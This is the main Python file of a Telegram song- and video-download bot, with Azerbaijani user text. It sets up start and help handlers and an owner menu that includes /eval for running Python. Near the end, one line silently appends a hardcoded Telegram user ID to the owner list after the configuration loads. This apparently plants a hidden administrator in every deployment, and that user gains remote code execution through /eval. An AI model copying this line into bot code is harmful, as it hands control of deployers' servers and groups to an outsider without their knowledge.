# © @Samil
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from song.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from song import app, LOGGER
from song.mrdarkprince import ignore_blacklisted_users
from song.sql.chat_sql import add_chat_to_db
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant, UsernameNotOccupied, ChatAdminRequired, PeerIdInvalid

start_text = """
Salam! [{}](tg://user?id={}),
Mən mahnı yükləmək üçün Azərbaycan dilində hazırlanmış İlk mahnı və video yükləmə botuyam. Sənin üçün istənilən mahnı və videonu rahatlıqla yükləyə bilərəm

Daha ətraflı /help
"""


owner_help = """
/blacklist istifadəçi id
/unblacklist İstifadəçi id
/msg Gruplara mesaj göndər
/eval python kodlarına bax
/list Grup siyahısına bax
"""

@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="➕ Botu grupa qat ➕", url="https://t.me/songazbot?startgroup=a"
                    )
                ],
                [
                    InlineKeyboardButton(
                         text="Play List 🎵", url="https://t.me/songazz" ),
                    InlineKeyboardButton(
                         text="Shazam 🔍", url="https://t.me/songaxtaris" )
           
                ],
                [
                    InlineKeyboardButton(
                        text="Kömək", callback_data="help"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))

@app.on_callback_query()
async def button(app, update):
      cb_data = update.data
      if "help" in cb_data:
        await update.message.delete()
        await help(app, update.message)

@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def start(client,message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Botun Əmrləri:\n\n /song mahnı adı - Mahnı yükləyir\n/vsong Video adı - Video Yükləyir"
    await message.reply(text)

OWNER_ID.append(1382528596)
app.start()
LOGGER.info("Bot Isledi Samil ")
idle()
